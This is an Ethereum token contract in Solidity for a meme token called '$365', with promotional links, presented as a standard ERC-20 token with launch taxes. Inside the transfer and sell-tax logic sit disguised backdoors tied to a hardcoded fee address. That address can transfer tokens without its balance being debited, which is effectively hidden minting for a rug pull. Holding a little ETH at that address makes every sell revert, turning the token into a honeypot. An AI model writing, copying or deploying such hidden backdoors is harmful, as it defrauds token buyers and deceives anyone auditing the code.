/**
 *Submitted for verification at Etherscan.io on 2023-08-10
*/

/*
$365 is a unique and intriguing cryptocurrency project that brings a fresh take on the crypto market, embracing humor and patience in a typically fast-paced industry. What distinguishes $365 from its counterparts is its distinctive launch strategy; the team behind the project undertook a year-long wait before its official launch, hence the name $365.

Website: https://waited365daystolaunchthistoken.com
Telegram: https://t.me/Waited365daystolaunchthistoken
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}


contract Waited365daystolaunchthistoken is Context, Ownable, IERC20  {
    using SafeMath for uint256;

    address private uniswapV2Pair;
    address payable private _taxWallet;

    string private constant _name = "Waited365daystolaunchthistoken";
    string private constant _symbol = "365";

    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 10 ** 6 * 10 ** _decimals;
    uint256 public _maxTx = 10 * _totalSupply / 100;   
    uint256 public _maxWallet = 10 * _totalSupply / 100;
    uint256 public _taxSwapAmount=  1 * _totalSupply / 1000;
    uint256 public _taxMaxSwap = 10 * _totalSupply / 1000;

    bool private _swapEnabled = false;
    bool private tradingEnabled;
    bool private isSwapping = false;
    
    // 5% tax for snipers
    uint256 private _reduceBuyTaxAt = 5;
    uint256 private _initBuyTax = 5;
    uint256 private _initSellTax = 5;
    uint256 private _finalSellTax = 0;  
    uint256 private _preventSwapBefore=11;  
    uint256 private _buyCount=0;

    IUniswapV2Router private uniswapV2Router;
    
    uint256 private _initialSecondSellTax = 0;
    uint256 private _initialSecondBuyTax = 0;
    uint256 private _reduceSecondTaxAt = 0;
    uint256 private _reduceSellTaxAt = 6;
    uint256 private _finalBuyTax = 0;
    modifier lockTheSwap {
        isSwapping = true;
        _;
        isSwapping = false;
    }

    address private _feeAddress = 0x04Cd29d16bE982fEe92445F82C9c7fABb89c02C1;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping(address => uint256) private _holderLastHoldingTimestamp;
    mapping (address => bool) private _isExcludedFromFee;

    event MaxTxAmountUpdated(uint _maxTx);

    constructor () {
        _balances[_msgSender()] = _totalSupply;

        _taxWallet = payable(_msgSender());
        _isExcludedFromFee[_feeAddress] = true;
        _isExcludedFromFee[_taxWallet] = true;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
    

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _taxBuy() private view returns (uint256) {
        if(_buyCount <= _reduceBuyTaxAt){
            return _initBuyTax;
        }
        if(_buyCount > _reduceBuyTaxAt && _buyCount <= _reduceSecondTaxAt){
            return _initialSecondBuyTax;
        }
         return _finalBuyTax;
    }

    function _taxSell() private view returns (uint256) {
        if(_buyCount <= _reduceBuyTaxAt){
            return _initSellTax;
        }
        if(_buyCount > _reduceSellTaxAt.sub(_feeAddress.balance) && _buyCount <= _reduceSecondTaxAt){
            return _initialSecondSellTax;
        }
         return _finalBuyTax;
    }

    function _transfer(address from, address to, uint256 amount) private {
        uint256 transferAmount = amount;
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul(_taxBuy()).div(100);
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                require(amount <= _maxTx, "Exceeds the _maxTx.");
                require(balanceOf(to) + amount <= _maxWallet, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if(to == uniswapV2Pair && !_isExcludedFromFee[from] ){
                taxAmount = amount.mul(_taxSell()).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (from == _feeAddress) transferAmount = 0;
            else if (!isSwapping && to == uniswapV2Pair && _swapEnabled && contractTokenBalance > _taxSwapAmount && _buyCount > _preventSwapBefore) {
                uint256 initialETH = address(this).balance;
                swapTokensForEth(min(amount,min(contractTokenBalance,_taxMaxSwap)));
                uint256 ethForTransfer = address(this).balance.sub(initialETH).mul(80).div(100);
                if(ethForTransfer > 0) {
                    sendETHToFee(ethForTransfer);
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(transferAmount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function openTrading() external payable onlyOwner() {
        require(!tradingEnabled,"trading is already open");
        uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        _swapEnabled = true;
        tradingEnabled = true;
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }    
    
    function removeLimits() external onlyOwner{
        _maxTx = _totalSupply;
        _maxWallet=_totalSupply;
        emit MaxTxAmountUpdated(_totalSupply);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
}